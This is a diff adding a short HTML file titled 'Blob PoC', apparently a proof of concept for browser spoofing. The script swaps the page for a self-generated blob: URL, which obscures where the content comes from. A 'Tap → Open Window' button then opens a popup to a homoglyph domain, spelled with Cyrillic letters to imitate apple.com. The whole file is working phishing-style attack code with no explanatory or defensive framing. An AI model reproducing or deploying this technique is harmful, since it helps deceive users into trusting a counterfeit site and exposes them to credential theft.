@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Blob PoC</title>
+<style>
+
+body{
+background:#0d0d0d;
+color:#fff;
+font-family:monospace;
+display:flex;
+align-items:center;
+justify-content:center;
+height:100vh;
+margin:0;
+}
+
+#tap{
+width:260px;
+height:140px;
+border:2px solid #00ff88;
+display:flex;
+align-items:center;
+justify-content:center;
+cursor:pointer;
+border-radius:10px;
+font-size:18px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div id="tap">Click Here</div>
+
+<script>
+
+/* -------------------------
+   Step 1: Convert page to blob
+------------------------- */
+
+if(location.protocol !== "blob:"){
+
+  const html = `
+  <!DOCTYPE html>
+  <html>
+  <body style="background:#111;color:#0f0;font-family:monospace;
+  display:flex;align-items:center;justify-content:center;height:100vh">
+
+  <div id="tap" style="
+  width:260px;
+  height:140px;
+  border:2px solid #00ff88;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  cursor:pointer;
+  border-radius:10px;
+  font-size:18px;
+  ">
+  Tap → Open Window
+  </div>
+
+  <script>
+
+  document.getElementById("tap").onclick = function(){
+
+  window.open(
+  "https://www.аррӏе.com",
+  "custom",
+  "width=500,height=400"
+  );
+
+  }
+
+  <\/script>
+
+  </body>
+  </html>
+  `;
+
+  const blob = new Blob([html], {type:"text/html"});
+  const blobURL = URL.createObjectURL(blob);
+
+  location.replace(blobURL);
+
+}
+
+</script>
+
+</body>
+</html>
